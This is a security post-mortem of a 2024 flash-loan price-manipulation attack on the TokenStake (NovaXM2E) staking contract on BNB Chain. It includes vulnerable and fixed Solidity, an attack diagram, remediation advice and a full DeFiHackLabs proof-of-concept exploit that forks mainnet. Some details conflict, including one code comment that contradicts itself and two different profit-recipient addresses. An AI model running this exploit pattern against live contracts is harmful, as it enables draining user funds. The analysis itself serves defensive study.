# TokenStake (NovaXM2E) — AMM Spot Price-Dependent Staking Sandwich Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2024-08-06 |
| **Protocol** | TokenStake (NovaXM2E Staking Contract) |
| **Chain** | BNB Smart Chain (BSC) |
| **Loss** | ~$24,971 USDT (NOVAX tokens drained from protocol) |
| **Attacker EOA** | [0x81ca...E79](https://bscscan.com/address/0x81ca56b6973fF63E3ff2b3F99cb6a6d211269E79) |
| **Attack Contract** | [0x42bC...D53](https://bscscan.com/address/0x42bC5A77985B2149A8FD085Bf1d3fCDA4Eb71D53) |
| **Attack Tx** | [0xb1ad...e012](https://bscscan.com/tx/0xb1ad1188d620746e2e64785307a7aacf2e8dbda4a33061a4f2fbc9721048e012) |
| **Vulnerable Contract (TokenStake)** | [0x55C9...BD2](https://bscscan.com/address/0x55C9EEbd368873494C7d06A4900E8F5674B11bD2) |
| **Oracle Contract** | [0xaEb7...Ea](https://bscscan.com/address/0xaEb77FF298970A7fB6DC6f5c4a7f02426Db814Ea) |
| **NOVAX Token** | [0xB800...491](https://bscscan.com/address/0xB800AFf8391aBACDEb0199AB9CeBF63771FcF491) |
| **Attack Block** | 41,116,211 |
| **Root Cause** | On stake(), the USD value is recorded as a snapshot; on withdraw(), the token amount is recalculated using a manipulated AMM spot price — when the price has been depressed, more tokens than originally staked can be withdrawn |
| **PoC Source** | [DeFiHackLabs / NovaXM2E_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-08/NovaXM2E_exp.sol) |

> **Note**: The user-reported loss of $578,000 was confirmed on-chain to be ~$24,971 USDT. $578K is deemed an erroneous figure unrelated to the flash loan size of 500,000 USDT.

---

## 1. Vulnerability Overview

TokenStake is designed so that when a user stakes NOVAX tokens, the **USD value at deposit time is recorded as a snapshot**, and at withdrawal the **token amount equivalent to that USD value is recalculated using the current market price** and returned.

The core problem is that the Oracle contract uses the **real-time spot price** (based on `getReserves`) of the PancakeSwap AMM. The attacker executed a sandwich attack in the following sequence:

1. **Before stake()**: Bulk-buy USDT→NOVAX to **artificially inflate** the NOVAX price → a smaller USD value is recorded
2. **After stake()**: Dump half the held NOVAX to **artificially depress** the NOVAX price
3. **withdraw()**: Recalculate the USD value into tokens at the depressed NOVAX price → **withdraw far more NOVAX than originally staked**
4. Sell the withdrawn NOVAX for USDT, repay the flash loan, and pocket the difference as profit

This vulnerability is a structural flaw whereby the **staking contract can be exploited by manipulating the price differential between the stake and withdraw moments**.

---

## 2. Vulnerable Code Analysis

### 2.1 Oracle.convertUsdBalanceDecimalToTokenDecimal() — Direct Use of AMM Spot Price (Core Vulnerability)

```solidity
// ❌ Vulnerable Oracle code — directly depends on PancakeSwap AMM spot price
function convertUsdBalanceDecimalToTokenDecimal(
    uint256 _usdBalance
) public view returns (uint256) {
    if (typeConvert == 2) {
        // Price calculated from real-time reserve ratio of PancakeSwap Pair
        // ❌ Manipulable within a single block: reserve ratio can be changed via bulk swaps
        (uint256 tokenBalance, uint256 stableBalance,) =
            IPancakePair(pairAddress).getReserves();

        // ❌ No TWAP; simple spot price calculation
        uint256 tokenAmount = (_usdBalance * tokenBalance) / stableBalance;

        // ❌ Only minTokenAmount / maxTokenAmount range checks exist — extreme manipulation
        //    is blocked, but manipulation within normal range (33% price swing) passes through
        if (minTokenAmount > 0 && tokenAmount < minTokenAmount)
            return minTokenAmount;
        if (maxTokenAmount > 0 && tokenAmount > maxTokenAmount)
            return maxTokenAmount;

        return tokenAmount;
    }
    // ...
}
```

```solidity
// ✅ Fixed Oracle code — uses TWAP or Chainlink price feed
function convertUsdBalanceDecimalToTokenDecimal(
    uint256 _usdBalance
) public view returns (uint256) {
    // ✅ Option 1: Uniswap V3 / PancakeSwap V3 TWAP (observation period of 30+ minutes)
    uint32[] memory secondsAgos = new uint32[](2);
    secondsAgos[0] = 1800; // 30 minutes ago
    secondsAgos[1] = 0;    // now

    (int56[] memory tickCumulatives, ) = IUniswapV3Pool(pool).observe(secondsAgos);
    int56 tickCumulativesDelta = tickCumulatives[1] - tickCumulatives[0];
    int24 arithmeticMeanTick = int24(tickCumulativesDelta / int56(uint56(1800)));
    uint256 sqrtPriceX96 = TickMath.getSqrtRatioAtTick(arithmeticMeanTick);
    uint256 price = FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, 2**192);

    return (_usdBalance * 1e18) / price;

    // ✅ Option 2: Use Chainlink price feed (safer)
    // (, int256 answer, , uint256 updatedAt, ) = priceFeed.latestRoundData();
    // require(block.timestamp - updatedAt <= 3600, "Stale price");
    // return (_usdBalance * 1e18) / uint256(answer);
}
```

**Issue**: Because the Oracle uses the real-time reserve ratio of the PancakeSwap AMM directly, the price can be manipulated within the same transaction via bulk swaps.

---

### 2.2 TokenStake.stake() — Recording the USD Value Snapshot

```solidity
// ❌ Vulnerable stake() code
function stake(uint256 _poolId, uint256 _stakeValue) external override lock {
    address stakeToken = stakeTokenPools[_poolId].stakeToken;
    require(IERC20(stakeToken).transferFrom(msg.sender, address(this), _stakeValue), "TS:T");

    // ❌ Snapshots the USD value at the current Oracle price
    // The attacker inflates the NOVAX price at this moment to record a lower stakeValueUsd
    // (In practice, a higher price yields a higher stakeValueUsd — the attacker's key move is the subsequent dump)
    uint256 stakeValueUsd = tokenToUsd(stakeToken, _stakeValue);
    // ❌ stakeValueUsd is stored as a snapshot → this value is used at withdraw time
    stakedToken[stakeIndex].totalValueStakeUsd = stakeValueUsd;

    emit Staked(stakeIndex, _poolId, msg.sender, _stakeValue, block.timestamp, unlockTimeEstimate);
}

// tokenToUsd: calculates USD using the Oracle price at stake time
function tokenToUsd(address token, uint256 _tokenAmount) public view returns (uint256) {
    address oracleContract = oracleContracts[token];
    // ❌ Relies on current spot price → price can be manipulated via bulk buy before staking
    return (1000000 * _tokenAmount) / IOracle(oracleContract).convertUsdBalanceDecimalToTokenDecimal(1000000);
}
```

---

### 2.3 TokenStake.withdraw() — Recalculating Token Amount at Manipulated Price (Core Flaw)

```solidity
// ❌ Vulnerable withdraw() code
function withdraw(uint256 _stakeId) public override lock {
    StakedToken memory _stakedUserToken = stakedToken[_stakeId];
    require(_stakedUserToken.userAddress == msg.sender, "TS:O");
    require(!_stakedUserToken.isWithdraw, "TS:W");
    require(_stakedUserToken.unlockTime <= block.timestamp, "TS:T");

    claimInternal(_stakeId);

    // ❌ Recalculates the token amount from the USD value recorded at stake time (totalValueStakeUsd)
    //    using the current Oracle price
    // → If the attacker dumps NOVAX just before withdraw(), the NOVAX price falls
    // → Converting the same USD value to tokens requires more NOVAX
    // → The attacker withdraws far more NOVAX than originally staked
    uint256 withdrawTokenValue = usdToToken(stakeToken, _stakedUserToken.totalValueStakeUsd);

    require(IERC20(stakeToken).transfer(_stakedUserToken.userAddress, withdrawTokenValue), "TS:U");
    // ...
}

// usdToToken: calculates token amount using the Oracle price at withdraw time
function usdToToken(address token, uint256 _usdAmount) public view returns (uint256) {
    address oracleContract = oracleContracts[token];
    // ❌ Relies on current (post-dump) spot price → more tokens returned when price falls
    return IOracle(oracleContract).convertUsdBalanceDecimalToTokenDecimal(_usdAmount);
}
```

```solidity
// ✅ Fixed withdraw() — returns the originally staked token amount as-is
function withdraw(uint256 _stakeId) public override lock {
    StakedToken memory _stakedUserToken = stakedToken[_stakeId];
    require(_stakedUserToken.userAddress == msg.sender, "TS:O");
    require(!_stakedUserToken.isWithdraw, "TS:W");
    require(_stakedUserToken.unlockTime <= block.timestamp, "TS:T");

    claimInternal(_stakeId);

    // ✅ Instead of recalculating via USD value, return the original staked token amount (totalValueStake)
    // This approach is unaffected by price manipulation
    uint256 withdrawTokenValue = _stakedUserToken.totalValueStake;

    require(IERC20(stakeToken).transfer(_stakedUserToken.userAddress, withdrawTokenValue), "TS:U");
    // ...
}
```

**Issue**: The design of recording the USD value at `stake()` time and reconverting it at the current price during `withdraw()` creates an attack vector that can be deliberately exploited by manipulating the price difference between the two moments. Staking contracts should in principle process deposits and withdrawals **based on token quantities**.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker EOA (0x81ca...) deploys the attack contract (0x42bC...)
- Prepares to request a flash loan from PancakeSwap V2 Pair (USDT/NOVAX: 0x7EFaEf...)
- No advance preparation required (approvals are handled in the attack contract constructor or during execution)

### 3.2 Execution Phase

1. **[Flash Loan Request]** Attack contract borrows 500,000 USDT as a flash loan from PancakeSwap V2 Pair
2. **[Swap 1: USDT→NOVAX]** Swaps the entire 500,000 USDT for NOVAX on PancakeSwap V3 Pair (0x05a9...) → receives 81,308.57 NOVAX (NOVAX price rises)
3. **[Stake Half]** Stakes 40,654.28 NOVAX into TokenStake.stake(poolId=0) → records a high USD value at the inflated stake-time price (stakeId=692)
4. **[Dump Remaining NOVAX]** Sells the remaining ~40,654 NOVAX on PancakeSwap → receives 299,840.55 USDT (NOVAX price falls)
5. **[Execute withdraw]** Calls TokenStake.withdraw(stakeId=692) → USD value reconverted to tokens at the post-dump, depressed NOVAX price → **withdraws 124,973.49 NOVAX** instead of the original 40,654 NOVAX (207% overpayment)
6. **[Dump Withdrawn NOVAX]** Sells the 124,973 NOVAX on PancakeSwap → receives 226,635.77 USDT
7. **[Repay Flash Loan]** Repays flash loan principal + fee: 501,504.51 USDT
8. **[Realize Profit]** Transfers remaining 24,971.81 USDT to attacker EOA

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                     Attacker EOA (0x81ca...)                    │
│              Deploys attack contract, then executes             │
└────────────────────────┬────────────────────────────────────────┘
                         │ pancakeCall() triggered
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│        PancakeSwap V2 Pair (USDT/NOVAX)  0x7EFaEf...          │
│                  Flash Loan: 500,000 USDT                       │
└────────────────────────┬────────────────────────────────────────┘
                         │ 500,000 USDT → Attack Contract
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│                  Attack Contract (0x42bC...)                    │
│  Step 1: 500,000 USDT → NOVAX (PancakeSwap V3)                 │
│          Received: 81,308.57 NOVAX  [NOVAX price ↑ rises]      │
└──────────┬──────────────────────────────┬───────────────────────┘
           │ Stake 40,654 NOVAX           │ Dump 40,654 NOVAX
           ▼                              ▼
┌──────────────────────┐        ┌─────────────────────────────────┐
│ TokenStake (0x55C9)  │        │  PancakeSwap V3 (0x05a9...)     │
│ stake(0, 40654 NOVAX)│        │  NOVAX → USDT 299,840.55        │
│ USD value snapshot   │        │  [NOVAX price ↓ falls]          │
│ recorded             │        └─────────────────────────────────┘
│ stakeId = 692        │
│ Oracle price ↑ high  │
└──────────┬───────────┘
           │ withdraw(692) called
           │ USD→Token recalculated at Oracle price ↓ low
           │ 40,654 USD value → 124,973 NOVAX returned (207% excess)
           ▼
┌─────────────────────────────────────────────────────────────────┐
│                  Attack Contract (0x42bC...)                    │
│  Step 2: 124,973 NOVAX → USDT 226,635.77 (PancakeSwap V3)      │
│  Total received: 299,840 + 226,635 = 526,476 USDT              │
│  Repaid: 501,504 USDT (flash loan + fee)                        │
│  Net profit: 24,971.81 USDT                                     │
└────────────────────────┬────────────────────────────────────────┘
                         │ Profit transferred
                         ▼
                ┌────────────────────┐
                │  Attacker EOA      │
                │  +24,971.81 USDT  │
                └────────────────────┘
```

### 3.4 Outcome

- **Attacker profit**: 24,971.81 USDT (~$24,972)
- **Protocol loss**: 84,319 excess NOVAX tokens drained from the TokenStake contract
- **Attack block**: #41,116,211 (BSC)
- **Oracle price change**: Before attack: 1 USD = 572,887 NOVAX-wei → After attack: 1 USD = 766,228 NOVAX-wei (+33.7%)

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Source: DeFiHackLabs/src/test/2024-08/NovaXM2E_exp.sol
// Attack Tx: https://bscscan.com/tx/0xb1ad1188d620746e2e64785307a7aacf2e8dbda4a33061a4f2fbc9721048e012

contract ContractTest is Test {
    IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    Uni_Router_V2 constant router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    // PancakeSwap V2 Pair (USDT/NOVAX) — flash loan source
    Uni_Pair_V2 constant Pair = Uni_Pair_V2(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IERC20 constant USDT = IERC20((0x55d398326f99059fF775485246999027B3197955));
    IERC20 NovaXM2E = IERC20(0xB800AFf8391aBACDEb0199AB9CeBF63771FcF491);
    uint256 swapamount;
    // Vulnerable TokenStake contract
    ITokenStake tokenStake = ITokenStake(0x55C9EEbd368873494C7d06A4900E8F5674B11bD2);

    function setUp() public {
        // Fork from BSC block 41,116,210 (block immediately before attack)
        vm.createSelectFork("bsc", 41_116_210);
        deal(address(USDT), address(this), 0);
    }

    function testExploit() public {
        // Step 1: Request flash loan of 500,000 USDT → triggers pancakeCall
        swapamount = 500_000 ether;
        Pair.swap(swapamount, 0, address(this), new bytes(1));
        // Print final profit
        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function pancakeCall(
        address, uint256, uint256, bytes calldata
    ) public {
        // Step 2: Swap all 500,000 USDT received from flash loan → NOVAX (price pumping)
        swap_token_to_token(address(USDT), address(NovaXM2E), USDT.balanceOf(address(this)));

        // Step 3: Approve NOVAX for TokenStake and stake half
        //         At this point the Oracle reflects a high NOVAX price → USD value snapshot recorded
        NovaXM2E.approve(address(tokenStake), NovaXM2E.balanceOf(address(this)));
        tokenStake.stake(0, NovaXM2E.balanceOf(address(this)) / 2);

        // Step 4: Sell all remaining NOVAX → dumping NOVAX price
        //         Oracle price falls below the price at stake() time
        swap_token_to_token(address(NovaXM2E), address(USDT), NovaXM2E.balanceOf(address(this)));

        // Step 5: withdraw — USD value reconverted to tokens at depressed Oracle price
        //         Staked 40,654 NOVAX → withdraws 124,973 NOVAX (207% excess)
        uint256 stakeIndex = tokenStake.stakeIndex();
        tokenStake.withdraw(stakeIndex);

        // Step 6: Sell all excess-withdrawn NOVAX
        swap_token_to_token(address(NovaXM2E), address(USDT), NovaXM2E.balanceOf(address(this)));

        // Step 7: Repay flash loan principal + fee
        USDT.transfer(address(Pair), swapamount * 10_000 / 9975 + 1000);
        // Attacker keeps ~24,971 USDT net profit
    }

    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | AMM Spot Price-Dependent Oracle — No TWAP | CRITICAL | CWE-1254: Improper Price Feed Design |
| V-02 | Staking Logic Flaw — Price Asymmetry Between stake/withdraw | HIGH | CWE-682: Incorrect Calculation |
| V-03 | Atomic Price Manipulation Within Flash Loan | HIGH | CWE-841: Improper Enforcement of Behavioral Workflow |

### V-01: AMM Spot Price-Dependent Oracle

- **Description**: The Oracle contract calculates the token price based on the real-time reserve ratio (`getReserves()`) of the PancakeSwap AMM. This spot price can be easily manipulated within a single transaction via bulk swaps, and no TWAP (Time-Weighted Average Price) or external price feed (e.g., Chainlink) is used.
- **Impact**: An attacker can manipulate the Oracle price in a desired direction within the same transaction via swaps, then call the staking contract's withdraw — which depends on that price — to illegitimately withdraw excess tokens.
- **Attack Conditions**: Sufficient liquidity in PancakeSwap V2/V3; Oracle uses `getReserves` of the relevant Pair; flash loan or large capital position available.

### V-02: Staking Logic Flaw — Price Asymmetry Between stake/withdraw

- **Description**: The design of recording the USD value as a snapshot at `stake()` time and reconverting it at the current price at `withdraw()` time creates an attack vector that can deliberately exploit the price difference between the two moments. In token-based staking contracts, USD value-denominated deposits and withdrawals necessarily carry the risk of price manipulation.
- **Impact**: More tokens than the principal can be drained from the protocol, preventing other users from withdrawing normally.
- **Attack Conditions**: Pool with no unlock restriction or a very short one, allowing `stake()` and `withdraw()` to be called within the same transaction.

### V-03: Atomic Price Manipulation Within Flash Loan

- **Description**: Flash loans allow large amounts of capital to be used temporarily within a single transaction. This enables atomic manipulation of AMM prices with large liquidity that ordinary users cannot hold, followed by restoration (repayment).
- **Impact**: Even attackers with small capital can repeatedly attack protocols with price-dependent logic.
- **Attack Conditions**: Flash loan-providing DEX (PancakeSwap, Uniswap, etc.) and the vulnerable protocol exist on the same chain.

---

## 6. Remediation Recommendations

### Immediate Actions

**[Recommendation 1] Replace Oracle with TWAP or External Price Feed**

```solidity
// ✅ Use Chainlink price feed (recommended)
contract SecureOracle {
    AggregatorV3Interface public priceFeed;
    uint256 public constant STALE_THRESHOLD = 3600; // 1 hour

    function convertUsdBalanceDecimalToTokenDecimal(
        uint256 _usdBalance
    ) public view returns (uint256) {
        (
            uint80 roundId,
            int256 answer,
            ,
            uint256 updatedAt,
            uint80 answeredInRound
        ) = priceFeed.latestRoundData();

        // ✅ Reject stale price data
        require(block.timestamp - updatedAt <= STALE_THRESHOLD, "Price data expired");
        require(answeredInRound >= roundId, "Incomplete round");
        require(answer > 0, "Invalid price");

        // ✅ Use tamper-resistant external price
        return (_usdBalance * 1e18) / uint256(answer);
    }
}
```

**[Recommendation 2] Remove USD Reconversion on withdraw — Return Principal Token Quantity**

```solidity
// ✅ Safe withdraw — returns the staked token amount (totalValueStake) as-is
function withdraw(uint256 _stakeId) public override lock {
    StakedToken memory _stakedUserToken = stakedToken[_stakeId];
    // ... validation logic ...

    claimInternal(_stakeId);

    address stakeToken = stakeTokenPools[_stakedUserToken.poolId].stakeToken;
    // ✅ Return principal token quantity without USD reconversion
    uint256 withdrawTokenValue = _stakedUserToken.totalValueStake;
    require(IERC20(stakeToken).transfer(_stakedUserToken.userAddress, withdrawTokenValue), "TS:U");

    stakedToken[_stakeId].isWithdraw = true;
    emit Harvested(_stakeId);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Spot price dependency | Use Chainlink NOVAX/USD feed or apply Uniswap V3 TWAP (minimum 30 minutes) |
| V-02: USD reconversion staking | Process stake/withdraw based on token quantities (use USD value calculation for UI display only) |
| V-03: Flash loan price manipulation | Prevent Oracle price manipulation + prevent stake→withdraw within a single block (`require(block.number > stakedToken[_stakeId].stakeBlock + DELAY_BLOCKS)`) |
| Additional: Withdrawal delay lock | Allow withdraw only after at least N blocks (or time) following stake |
| Additional: Flash loan detection | Introduce a Circuit Breaker to detect sudden spikes in staking amounts |

---

## 7. Lessons Learned

1. **USD value-based deposits and withdrawals in staking contracts are highly dangerous**: Token prices can be manipulated, so staking contracts should in principle process deposits and withdrawals based on **token quantities**, not USD value. USD value calculations should be used for display purposes only.

2. **AMM spot prices must never be used as an Oracle**: Price calculations based on `getReserves()` or `balanceOf(pair)` can be manipulated within a single transaction. DeFi protocols must use manipulation-resistant price feeds such as TWAP, Chainlink, or Pyth.

3. **A time delay (time lock) between stake and withdraw is essential**: Allowing stake → price manipulation → withdraw within the same transaction enables attacks combined with flash loans. A minimum withdrawal delay of 1–2 epochs (or several dozen blocks) must be enforced.

4. **Flash loans effectively eliminate capital constraints for attackers**: Even attackers with small capital can execute hundreds-of-thousands-of-dollars-scale price manipulation attacks via flash loans. The security assumption that "attackers won't have large capital" is invalid in any protocol design.

5. **Detection of similar patterns**: Any staking contract exhibiting the "record USD value at stake, reconvert at withdraw" pattern may share the same vulnerability. When this pattern is found, oracle manipulation potential should be reviewed immediately.

6. **Risk of small-cap projects on BSC**: For low-liquidity tokens, relatively small capital can cause large price swings, making the same attack mechanism even more impactful.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Field | PoC Expected | On-Chain Actual | Match |
|------|-----------|-------------|------|
| Flash loan amount | 500,000 USDT | 500,000 USDT | ✅ |
| NOVAX received (swap 1) | 81,308.57 NOVAX | 81,308.57 NOVAX | ✅ |
| Staked NOVAX | 40,654.28 NOVAX | 40,654.28 NOVAX | ✅ |
| USDT after dump 1 | ~299,840 USDT | 299,840.55 USDT | ✅ |
| NOVAX after withdraw | ~125,000 NOVAX | 124,973.49 NOVAX | ✅ |
| USDT after dump 2 | ~226,635 USDT | 226,635.77 USDT | ✅ |
| Flash loan repayment | 501,252+ USDT | 501,504.51 USDT | ✅ |
| **Net profit** | **~24,971 USDT** | **24,971.81 USDT** | **✅** |

> **Loss figure correction**: The user-provided figure of $578,000 is deemed unrelated to this incident. The actual attack profit confirmed on-chain is **$24,971.81 USDT**, and the protocol loss corresponds to the value of NOVAX tokens drained from the TokenStake contract.

### 8.2 On-Chain Event Log Sequence

| # | Event | Contract | Details |
|---|--------|----------|------|
| 1 | Transfer (USDT) | PancakeSwap V2 Pair → Attack Contract | 500,000 USDT flash loan |
| 2 | Approval (USDT) | Attack Contract → PancakeSwap Router | Infinite approval |
| 3 | Transfer (USDT) | Attack Contract → PancakeSwap V3 | 500,000 USDT sold |
| 4 | Transfer (NOVAX) | PancakeSwap V3 → Attack Contract | 81,308.57 NOVAX received |
| 5 | Sync | PancakeSwap V3 Pair | NOVAX price increase reflected |
| 6 | Swap | PancakeSwap V3 | USDT→NOVAX swap completed |
| 7 | Transfer (NOVAX) | Attack Contract → TokenStake | 40,654.28 NOVAX staked |
| 8 | Staked | TokenStake | stakeId=692 created |
| 9 | Transfer (NOVAX) | Attack Contract → PancakeSwap V3 | ~40,654 NOVAX dumped |
| 10 | Transfer (USDT) | PancakeSwap V3 → Attack Contract | 299,840.55 USDT received |
| 11 | Sync | PancakeSwap V3 Pair | NOVAX price decrease reflected |
| 12 | Transfer (NOVAX) | TokenStake → Attack Contract | 124,973.49 NOVAX withdrawn (207% of principal) |
| 13 | Harvested | TokenStake | stakeId=692 completed |
| 14 | Transfer (NOVAX) | Attack Contract → PancakeSwap V3 | 124,973 NOVAX second dump |
| 15 | Transfer (USDT) | PancakeSwap V3 → Attack Contract | 226,635.77 USDT received |
| 16 | Transfer (USDT) | Attack Contract → PancakeSwap V2 | 501,504.51 USDT flash loan repaid |
| 17 | Transfer (USDT) | Attack Contract → 0x8077... | 24,971.81 USDT profit transferred |

### 8.3 Pre-Condition Verification

| Field | State Before Attack (Block 41,116,210) | Verification Result |
|------|-------------------------------|----------|
| Oracle type | typeConvert = 2 (PancakeSwap Pair-based) | Vulnerable condition confirmed |
| NOVAX per 1 USD (pre-attack) | 572,887 NOVAX-wei | Normal price state |
| NOVAX per 1 USD (post-dump, block 41,116,211) | 766,228 NOVAX-wei | +33.7% (NOVAX value depreciated) |
| Flash loan lock | None (withdraw possible immediately after staking) | Vulnerable condition confirmed |
| Attacker initial balance | 0 USDT (before flash loan) | Attack executed with zero capital confirmed |

### 8.4 Pattern DB Update Notice

The **"staking contract stake/withdraw USD reconversion + AMM spot price combination"** pattern confirmed in this incident represents a compound vulnerability at the intersection of the existing `patterns/17_staking_reward.md` and `patterns/04_oracle_manipulation.md`. It is recommended to add the "USD value-based staking reconversion" pattern to `patterns/17_staking_reward.md`.

---

*Analysis date: 2026-04-11*
*PoC source: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-08/NovaXM2E_exp.sol)*
*On-chain verification: BSCScan, Foundry cast (BSC mainnet block 41,116,210~41,116,211)*